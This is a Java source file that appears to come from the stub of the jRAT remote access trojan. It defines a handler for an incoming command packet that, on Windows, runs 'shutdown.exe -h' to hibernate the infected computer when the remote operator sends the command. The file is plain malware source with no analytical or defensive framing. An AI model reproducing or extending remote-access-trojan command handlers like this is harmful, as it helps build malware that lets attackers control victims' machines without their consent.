package io.jrat.stub.packets.incoming;

public class Packet31ComputerSleep extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String operatingSystem = System.getProperty("os.name");
		if (operatingSystem.toLowerCase().contains("windows")) {
			Runtime.getRuntime().exec("shutdown.exe -h");
		}
	}

}
